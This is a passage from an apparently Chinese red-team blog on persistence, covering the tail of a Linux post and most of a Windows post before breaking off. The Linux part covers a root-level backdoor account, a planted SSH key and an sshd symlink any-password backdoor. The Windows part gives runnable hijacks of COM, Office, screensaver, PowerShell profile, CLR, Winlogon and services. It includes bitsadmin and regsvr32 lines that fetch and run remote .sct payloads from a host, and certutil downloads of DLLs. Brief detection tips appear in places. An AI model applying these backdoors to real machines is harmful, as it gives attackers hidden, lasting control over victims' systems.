<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [15:33:32] C:255</span><br><span class="line">$ ssh backdoor2@10.211.55.12</span><br><span class="line">backdoor2@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Mon Nov  2 15:31:59 2020 from 10.211.55.2</span><br><span class="line">[root@CentOS7 ~]# w</span><br><span class="line"> 15:34:06 up  1:12,  2 users,  load average: 0.00, 0.01, 0.01</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">u111     tty1                      14:44   49:10   0.00s  0.00s -bash</span><br><span class="line">backdoor pts&#x2F;0    10.211.55.2      15:34    3.00s  0.00s  0.00s w</span><br><span class="line">[root@CentOS7 ~]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h4 id="可疑用户排查"><a href="#可疑用户排查" class="headerlink" title="可疑用户排查"></a>可疑用户排查</h4><h3 id="ssh公钥添加"><a href="#ssh公钥添加" class="headerlink" title="ssh公钥添加"></a>ssh公钥添加</h3><p>在攻击机任意地方执行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -b 4096 -t rsa -C &quot;&quot;</span><br><span class="line"></span><br><span class="line"> -t 指定加密算法，使用 -b 自定生成密钥长度，使用 -C 添加密钥对的说明comment。生成的密钥对默认存储在用户目录下的 .ssh 目录中，私钥默认名称为 id_*** (即 id_ + 加密算法名称)。还可以使用 -f 指定生成的私钥存储的文件全路径名称；也可以不使用 -f 指定密钥文件路径，在密钥的创建过程中还会提示用户输入密钥文件全路径名称。私钥对应的公钥文件为私钥文件全名称 + .pub。</span><br></pre></td></tr></table></figure>

<p>受害机:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>
<p>攻击者的id_rsa.pub内容粘贴到文件里面(如果原来存在内容就另起一行粘贴)</p>
<p>然后就能在攻击机登陆上去了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i &#x2F;Users&#x2F;mieea&#x2F;.ssh&#x2F;testkey root@10.211.55.12</span><br></pre></td></tr></table></figure>

<h3 id="ssh软连接"><a href="#ssh软连接" class="headerlink" title="ssh软连接"></a>ssh软连接</h3><p>经典后门，直接对sshd建立软连接，之后用任意密码登录即可。<br>原命令：<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=12345;</code></p>
<p>原理分析完整:<a href="https://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/">Linux软连接ssh后门之我见</a><br>摘要一下重点:<br>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0(root)即可成功认证登陆。<br>为什么是通过软连接的方式？因为PAM认证是通过软连接的文件名(如<code>/tmp/su</code>,<code>/home/su</code>)在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如：<code>/etc/pam.d/su</code>)<br>任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，只要PAM配置文件中包含此配置即可SSH任意密码登陆，实践表明，可成功利用的PAM配置文件除了su还有chsh、chfn。</p>
<h4 id="实践的坑点"><a href="#实践的坑点" class="headerlink" title="实践的坑点"></a>实践的坑点</h4><p>CentOS7:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345</span><br></pre></td></tr></table></figure>
<p>软连接建立后，新的端口链接被拒绝。即<code>-p 22</code>是正常的，<code>-p 12345</code>拒绝连接。<br>搜索后发现应该和SELinux和防火墙有关，进行以下操作后就能任意密码登陆:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">semanage port -a -t ssh_port_t -p tcp 12345</span><br><span class="line">firewall-cmd --permanent --zone&#x3D;public --add-port&#x3D;12345&#x2F;tcp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<p>参考:<a href="https://github.com/LLLeon/Blog/issues/8">更改CentOS7默认的SSH端口</a></p>
<p>Ubuntu18.04:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345</span><br></pre></td></tr></table></figure>
<p>命令执行后u111用户可以正常任意密码登陆，但root无法登陆，提示<code>Permission denied, please try again.</code>。<br>修改PermitRootLogin为yes后依然不行，搜了半天也搜不到解决方案，暂时放弃。</p>
<h4 id="排查-6"><a href="#排查-6" class="headerlink" title="排查"></a>排查</h4><p>进程和端口都能发现异常: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -anplt</span><br><span class="line">ps auxf</span><br></pre></td></tr></table></figure>

<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p>[1].<a href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/">linux常见backdoor及排查技术</a><br>[2].<a href="https://xz.aliyun.com/t/7338">Linux下的权限维持</a><br>[3].<a href="https://www.freebuf.com/column/162604.html">警惕利用Linux预加载型恶意动态链接库的后门</a></p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>redteam</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows单机权限维持</title>
    <url>/posts/45439/</url>
    <content><![CDATA[<h1 id="Windows单机权限维持"><a href="#Windows单机权限维持" class="headerlink" title="Windows单机权限维持"></a>Windows单机权限维持</h1><p>关键点：免杀+自启动</p>
<h2 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h2><h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p>常见的渗透框架都支持快捷方式的生成和移动到自启动目录中，原理几乎都是改写快捷方式的<code>target</code>。<br>还有很多其他脚本工具可以开发恶意快捷方式。</p>
<h3 id="文件扩展名默认操作"><a href="#文件扩展名默认操作" class="headerlink" title="文件扩展名默认操作"></a>文件扩展名默认操作</h3><p>Windows中，每个文件扩展名都与一个默认程序关联，关联通过注册表实现。<br>指定扩展名处理程序的注册表有2处：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CLASSES_ROOT # Global</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts # Local</span><br></pre></td></tr></table></figure>
<p>用户试图打开文件时，先在HKEY_USERS查找是否存在扩展名注册表项。如果没有，再到HKEY_CLASSES_ROOT查找。</p>
<a id="more"></a>
<p>示例：<br><img src="/images/%E6%89%A9%E5%B1%95%E7%A8%8B%E5%BA%8F%E7%AF%A1%E6%94%B9.png" alt="扩展程序篡改"><br>ProxyApp会处理扩展，创建一个新进程，同时默认程序也会正常运行，用户不会感受到差异。</p>
<h3 id="com组件劫持"><a href="#com组件劫持" class="headerlink" title="com组件劫持"></a>com组件劫持</h3><p>COM(Component Object Model)可以理解为一套给C/C++用的接口，或者说一个通用的ABI规范，只要遵从这个规范，不管用什么语言写的程序都可以互相调用。劫持com组件不需要管理员权限，因为在HKCU中注册的类优先级高于HKLM中的。但有时会仅从HKLM中加载对象，以防止提权。<br>COM相关常见标志符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UUID ： 代表COM</span><br><span class="line">CLSID ： 代表COM组件中的类</span><br><span class="line">IID ：代表COM组件中的接口</span><br></pre></td></tr></table></figure>
<p>COM调用过程：编写好一个COM组件，一般都需要注册到注册表中，当调用COM组件的这个功能的时候，程序会进注册表进行读取相应位置的DLL或者EXE，加载到进程还是线程中供使用。<br>常被利用的键值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InprocServer&#x2F;InprocServer32 # 动态链接库文件(dll)的路径</span><br><span class="line">LocalServer&#x2F;LocalServer32 # 可执行文件(exe)的路径</span><br><span class="line">TreatAs</span><br><span class="line">ProgID</span><br></pre></td></tr></table></figure>
<p>这些键所在的注册表项位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Classes\CLSID</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Classes\CLSID</span><br></pre></td></tr></table></figure>
<p>常用劫持手法：<br>1.增加缺少的CLSID进行利用<br>2.修改原有CLSID加载的程序<br>3.替换掉CLSID下加载路径的程序</p>
<h4 id="寻找可劫持com-keys"><a href="#寻找可劫持com-keys" class="headerlink" title="寻找可劫持com keys"></a>寻找可劫持com keys</h4><p>1.process monitor(麻烦)<br>过滤设置如下4条：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Operation is RegOpenKey</span><br><span class="line">Result is NAME NOT FOUND</span><br><span class="line">Path ends with InprocServer32</span><br><span class="line">Exclude if path starts with HKLM</span><br></pre></td></tr></table></figure>
<p>然后打开一些常用应用，process monitor就会捕获到可以用于劫持的，将结果导出为CSV文件。<br>再使用<a href="https://github.com/nccgroup/acCOMplice">acCOMplice</a>筛选出最终可劫持。<br>2.在计划任务中寻找<br><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1">Get-ScheduledTaskComHandler.ps1</a><br>使用方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Get-ScheduledTaskComHandler.ps1</span><br><span class="line">Get-ScheduledTaskComHandler -PersistenceLocations</span><br></pre></td></tr></table></figure>

<h4 id="无文件执行"><a href="#无文件执行" class="headerlink" title="无文件执行"></a>无文件执行</h4><p><code>ScriptletURL</code>键值用于指定任意远程<code>.sct</code>文件url地址。<br><img src="/images/scriptleturl.png" alt="scriptleturl"><br>使用以下命令进行激活com类，同时会执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rundll32.exe -sta &#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;</span><br></pre></td></tr></table></figure>

<h4 id="InprocServer32"><a href="#InprocServer32" class="headerlink" title="InprocServer32"></a>InprocServer32</h4><p>POC: <a href="https://github.com/3gstudent/COM-Object-hijacking">COM-Object-hijacking</a><br>这种利用方式对DLL的构造有所要求。</p>
<h4 id="LocalServer32"><a href="#LocalServer32" class="headerlink" title="LocalServer32"></a>LocalServer32</h4><p>篡改后需要通过powershell命令激活：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;45EAE363-122A-445A-97B6-3DE890E786F8&quot;))</span><br></pre></td></tr></table></figure>

<h4 id="TreatAs-ProgID"><a href="#TreatAs-ProgID" class="headerlink" title="TreatAs/ProgID"></a>TreatAs/ProgID</h4><p>TreatAs是，可以被用于将COM对象重定向到另一个COM对象。<br>step1.在HKCU注册创建恶意CLSID<br>step2.在合法的CLSID下添加键TreatAs，内容为恶意CLSID<br>一个CLSID会被一个或多个ProgID所指向，可以直接篡改指向的CLSID。（但我觉得还是改TreatAs靠谱）</p>
<h3 id="office"><a href="#office" class="headerlink" title="office "></a>office </h3><h4 id="templates"><a href="#templates" class="headerlink" title="templates"></a>templates</h4><p>Office会创建一个用于存放模版的文件夹，每次Office应用打开时会加载默认模板。如果把恶意宏代码嵌入到默认模板中，就可以利用于权限维持。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\zhangsan\AppData\Roaming\Microsoft\Templates</span><br></pre></td></tr></table></figure>

<h4 id="add-ins"><a href="#add-ins" class="headerlink" title="add-ins"></a>add-ins</h4><p>Office add-ins本质上是DLL文件，但根据应用程序后缀有所不同，例如word的是<code>.wll</code>，excel的是<code>xll</code>。每次应用程序打开时都会加载其对应add-ins。<br>通过powershell命令查找放置word程序的add-ins存放文件夹：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ChildItem &quot;hkcu:\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations&quot;</span><br></pre></td></tr></table></figure>
<p>查找结果应该类似于：<code>C:\User\Admin\AppData\Roaming\Microsoft\Word\Startup</code><br>将恶意dll放置到文件夹下，并根据应用程序修改其后缀，比如此处应该为<code>hack.wll</code>。<br>具体利用参照：<a href="https://github.com/3gstudent/Office-Persistence">Office-Persistence</a></p>
<h4 id="office-test"><a href="#office-test" class="headerlink" title="office test"></a>office test</h4><p>在开发阶段，Office应用会使用Perf键来加载dll进行性能评估。因此可利用于权限维持。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf&quot; &#x2F;t REG_SZ &#x2F;d C:\tmp\pentestlab.dll</span><br></pre></td></tr></table></figure>

<h3 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h3><p>主要是对以下几个注册表项的篡改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</span><br></pre></td></tr></table></figure>
<p>屏幕保护程序是<code>.src</code>可执行文件，因此篡改时后缀可修改为<code>.exe</code>也能正常执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;hkcu\control panel\desktop&quot; &#x2F;v SCRNSAVE.EXE &#x2F;d c:\tmp\pentestlab.exe </span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; &#x2F;v SCRNSAVE.EXE &#x2F;d c:\tmp\pentestlab.scr </span><br><span class="line"># cmd</span><br><span class="line"></span><br><span class="line">New-ItemProperty -Path &#39;HKCU:\Control Panel\Desktop\&#39; -Name &#39;SCRNSAVE.EXE&#39; - Value &#39;c:\tmp\pentestlab.exe&#39;</span><br><span class="line">New-ItemProperty -Path &#39;HKCU:\Control Panel\Desktop\&#39; -Name &#39;SCRNSAVE.EXE&#39; - Value &#39;c:\tmp\pentestlab.scr&#39;</span><br><span class="line"># powershell</span><br></pre></td></tr></table></figure>

<p>实际利用问题：<br>1.当用户回电脑前继续操作时“屏幕保护程序”中断，即会话将中断。<br>2.屏幕保护程序可能会被组策略禁用。<br>（3.感觉现在用屏保的人不多？</p>
<h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><p>Bitsadmin在win7及之后系统自带，可以用来创建上传或者下载任务，并且可以指定下载成功之后要进行什么命令。<br>作为后门利用：创建下载任务并执行命令。(无法自动启动，可能需要和别处联动)<br>示例1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create backdoor</span><br><span class="line"># 创建名为backdoor的job</span><br><span class="line">bitsadmin &#x2F;addfile backdoor &quot;http:&#x2F;&#x2F;10.0.2.21&#x2F;pentestlab.exe&quot;  &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line"># 指定下载URL与本地存储路径</span><br><span class="line">bitsadmin &#x2F;SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL</span><br><span class="line"># 指定job下载完成后执行的命令</span><br><span class="line">bitsadmin &#x2F;SetMinRetryDelay &quot;backdoor&quot; 60</span><br><span class="line"># 设置重试时间间隔</span><br><span class="line">bitsadmin &#x2F;resume backdoor</span><br><span class="line"># 运行job</span><br></pre></td></tr></table></figure>
<p>示例2，利用regsvr32的文件不落地后门：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;10.0.2.21:8080&#x2F;FHXSd9.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin &#x2F;resume backdoor</span><br></pre></td></tr></table></figure>

<h4 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;list &#x2F;allusers &#x2F;verbose</span><br></pre></td></tr></table></figure>

<h3 id="powershell配置文件"><a href="#powershell配置文件" class="headerlink" title="powershell配置文件"></a>powershell配置文件</h3><p>powershell配置文件是一个用户自定义环境并在会话启动时执行特定命令的powershell脚本。如果系统用户经常使用powershell，那么就可以利用配置文件实现持久后门。<br>示例1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">Test-Path $profile # 验证$profile文件是否存在</span><br><span class="line">New-Item -Path $profile -Type File –Force # 如果不存在则新创建</span><br><span class="line">$string &#x3D; &#39;Start-Process &quot;C:\tmp\pentestlab.exe&quot;&#39; # 指定后门程序路径</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShe</span><br><span class="line">ll_profile.ps1&quot; -Append</span><br></pre></td></tr></table></figure>
<p>示例2，比1隐蔽：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">Test-Path $profile</span><br><span class="line">New-Item -Path $profile -Type File –Force</span><br><span class="line">Add-Content $profile &quot;Invoke-Item C:\tmp\launcher.bat&quot;</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps 1&quot; -Append</span><br></pre></td></tr></table></figure>
<p>示例3：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $profile</span><br><span class="line">Test-Path $profile</span><br><span class="line">New-Item -Path $profile -Type File –Force</span><br><span class="line">$string &#x3D; &#39;Invoke-Command -ScriptBlock &#123; regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;10.0.2.21:8080&#x2F;jWcEbr.sct s</span><br><span class="line">crobj.dll &#125;&#39; # Invoke-Command可以用于执行命令</span><br><span class="line">$string | Out-File -FilePath &quot;C:\Users\pentestlab\Documents\WindowsPowerShell\Microsoft.PowerShe</span><br><span class="line">ll_profile.ps1&quot; -Append</span><br></pre></td></tr></table></figure>

<h3 id="利用clr劫持-net"><a href="#利用clr劫持-net" class="headerlink" title="利用clr劫持.net"></a>利用clr劫持.net</h3><p>CLR(Common Language Runtime)是一个可由多种编程语言使用的运行环境(类似JRE)。<br>CLR是.NET Framework的主要执行引擎，核心功能包括内存管理、程序集加载、安全性、异常处理和线程同步。<br>利用相关变量：　</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COR_ENABLE_PROFILING: The CLR connects to a profiler only if this environment variable exists and is set to 1.</span><br><span class="line">COR_PROFILER: If the COR_ENABLE_PROFILING check passes, the CLR connects to the profiler that has this CLSID or ProgID, which must have been stored previously in the registry.</span><br></pre></td></tr></table></figure>
<p>利用原理可以通俗解释为：所有.NET程序都会在CLR运行，如果设置了COR_ENABLE_PROFILING，那么COR_PROFILER指定的DLL会被加载到CLR中运行。即一旦.NET程序运行，COR_PROFILER指定的DLL就会被触发运行。</p>
<p>32位POC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic ENVIRONMENT create name&#x3D;&quot;COR_ENABLE_PROFILING&quot;,username&#x3D;&quot;%username%&quot;,VariableValue&#x3D;&quot;1&quot;</span><br><span class="line">wmic ENVIRONMENT create name&#x3D;&quot;COR_PROFILER&quot;,username&#x3D;&quot;%username%&quot;,VariableValue&#x3D;&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg.dll</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg.dll delete</span><br><span class="line">SET KEY&#x3D;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;VE &#x2F;T REG_SZ &#x2F;D &quot;%CD%\msg.dll&quot; &#x2F;F</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;V ThreadingModel &#x2F;T REG_SZ &#x2F;D Apartment &#x2F;F</span><br></pre></td></tr></table></figure>
<p>64位POC：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic ENVIRONMENT create name&#x3D;&quot;COR_ENABLE_PROFILING&quot;,username&#x3D;&quot;%username%&quot;,VariableValue&#x3D;&quot;1&quot;</span><br><span class="line">wmic ENVIRONMENT create name&#x3D;&quot;COR_PROFILER&quot;,username&#x3D;&quot;%username%&quot;,VariableValue&#x3D;&quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot;</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg.dll</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg.dll delete</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg_x64.dll</span><br><span class="line">certutil.exe -urlcache -split -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;test&#x2F;master&#x2F;msg_x64.dll delete</span><br><span class="line">SET KEY&#x3D;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;VE &#x2F;T REG_SZ &#x2F;D &quot;%CD%\msg_x64.dll&quot; &#x2F;F</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;V ThreadingModel &#x2F;T REG_SZ &#x2F;D Apartment &#x2F;F </span><br><span class="line">SET KEY&#x3D;HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\&#123;11111111-1111-1111-1111-111111111111&#125;\InProcServer32</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;VE &#x2F;T REG_SZ &#x2F;D &quot;%CD%\msg.dll&quot; &#x2F;F</span><br><span class="line">REG.EXE ADD %KEY% &#x2F;V ThreadingModel &#x2F;T REG_SZ &#x2F;D Apartment &#x2F;F</span><br></pre></td></tr></table></figure>

<p>POC ref:<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/">Use CLR to maintain persistence</a></p>
<p>注意通过wmic命令修改环境变量可能会被杀软(360..)拦截，可以替换为通过powershell写注册表，效果是相同的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; COR_ENABLE_PROFILING -value &quot;1&quot; -propertyType string | Out-Null</span><br><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; COR_PROFILER -value &quot;&#123;11111111-1111-1111-1111-111111111111&#125;&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>

<h4 id="排查-1"><a href="#排查-1" class="headerlink" title="排查"></a>排查</h4><p>检查环境变量<code>COR_ENABLE_PROFILING</code>和<code>COR_PROFILER</code><br>检查注册表键值<code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code></p>
<h3 id="LogonScript"><a href="#LogonScript" class="headerlink" title="LogonScript"></a>LogonScript</h3><p>注册表路径：<code>HKCU\Environment\</code><br>创建字符串键：<code>UserInitMprLogonScript</code>，键值设置为恶意程序绝对路径。<br>利用该方法可以一定程度上绕过杀软，但有些杀软优是先于Logon Scripts启动的。</p>
<h4 id="排查-2"><a href="#排查-2" class="headerlink" title="排查"></a>排查</h4><p>排查注册表键值<code>HKCR\Environment\UserInitMprLogonScript</code></p>
<h2 id="管理员权限"><a href="#管理员权限" class="headerlink" title="管理员权限"></a>管理员权限</h2><h3 id="Winlogon-Helper-DLL"><a href="#Winlogon-Helper-DLL" class="headerlink" title="Winlogon Helper DLL"></a>Winlogon Helper DLL</h3><p>Winlogon是负责处理安全相关的用户交互界面的组件，例如登入、登出、在认证时加载用户信息、关机、锁屏等。<br>可以对以下注册表项进行篡改，注意程序需要放在system32：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</span><br><span class="line"># Shell - explorer.exe,door.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</span><br><span class="line"># Userinit - C:\Windows\system32\userinit.exe,door.exe</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify</span><br><span class="line"># Notify一般在win7之前的系统才有，替换其DLLName项为door.exe即可</span><br></pre></td></tr></table></figure>
<p>使用命令修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; &#x2F;v Userinit &#x2F;d &quot;Userinit.exe, pentestlab.exe&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; &#x2F;v Shell &#x2F;d &quot;explorer.exe, pentestlab.exe&quot; &#x2F;f</span><br><span class="line"># cmd</span><br><span class="line"></span><br><span class="line">Set-ItemProperty &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&quot; &quot;Userinit&quot; &quot;Userinit.exe, pentestlab.exe&quot; -Force</span><br><span class="line">Set-ItemProperty &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&quot; &quot;Shell&quot; &quot;explorer.exe, pentestlab.exe&quot; -Force</span><br><span class="line"># powershell</span><br></pre></td></tr></table></figure>

<h3 id="AddMonitor"><a href="#AddMonitor" class="headerlink" title="AddMonitor()"></a>AddMonitor()</h3><p>该权限维持方式源于14年Defcon22。<br>原理：print spooler service负责管理Windows系统中的打印作业，print spooler的API包含了一个函数AddMonitor()用于按照本地端口管理器并关联配置文件、数据、管理器文件。该函数通过创建注册表键来向<code>spoolsv.exe</code>进程注入dll文件。</p>
<p>具体操作：<a href="https://www.ired.team/offensive-security/persistence/t1013-addmonitor">t1013-addmonitor</a></p>
<h4 id="排查-3"><a href="#排查-3" class="headerlink" title="排查"></a>排查</h4><p>对应注册表项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors</span><br></pre></td></tr></table></figure>

<h3 id="热键利用"><a href="#热键利用" class="headerlink" title="热键利用"></a>热键利用</h3><p>sethc.exe           粘滞键<br>magnify.exe         放大镜后门<br>utilman.exe         实用程序<br>osk.exe             屏幕键盘<br>displayswitch.exe   扩展屏幕<br>atbroker.exe        辅助管理工具<br>narrator.exe        讲述人</p>
<h4 id="Narrator"><a href="#Narrator" class="headerlink" title="Narrator"></a>Narrator</h4><p>Win10中Narrator是一个屏幕阅读应用程序，可以被利用于无文件权限维持。</p>
<h5 id="利用1"><a href="#利用1" class="headerlink" title="利用1"></a>利用1</h5><p>1.前往注册表位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Computer\HKEY_CURRENT_USER\Software\Classes\AppXypsaf9f1qserqevf0sws76dx4k9a5206\Shell\open\command</span><br></pre></td></tr></table></figure>
<p>2.删除<code>DelegateExecute</code>项<br>3.将默认项的值修改为要执行的命令<br><img src="/images/narrator%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9%E4%BF%AE%E6%94%B9.png" alt="narrator注册表项"></p>
<h5 id="利用2"><a href="#利用2" class="headerlink" title="利用2"></a>利用2</h5><p>Narrator的一个与本地化设置无关的DLL，可以被替换为恶意DLL(不修改文件名)。<br>文件位置：<code>C:\Windows\System32\Speech\Engines\TTS\MSTTSLocEnUS.DLL</code></p>
<h3 id="修改服务"><a href="#修改服务" class="headerlink" title="修改服务"></a>修改服务</h3><p>这种权限维持方式非常容易被发现，不推荐，但在防护很弱的环境下可以尝试使用。<br>修改服务一般通过这三种位置来完成：binPath、ImagePath、FailureCommand</p>
<h4 id="binPath"><a href="#binPath" class="headerlink" title="binPath"></a>binPath</h4><p><code>sc</code>命令可以对服务进行操作，包括启动、暂停、停止、修改文件路径等。<br>示例：<br>Fax是win10中自带但一般不使用的服务，因此是个不错的修改选择。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config Fax binPath&#x3D; &quot;C:\windows\system32\pentestlab.exe&quot;</span><br><span class="line">sc start Fax</span><br></pre></td></tr></table></figure>
<p>还可以将该服务直接设置为自启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config Fax binPath&#x3D; &quot;C:\Windows\System32\pentestlab.exe&quot; start&#x3D;&quot;auto&quot; obj&#x3D;&quot;LocalSystem&quot;</span><br></pre></td></tr></table></figure>

<h4 id="ImagePath"><a href="#ImagePath" class="headerlink" title="ImagePath"></a>ImagePath</h4><p>即常用的修改注册表键值的手段，例如：</p>
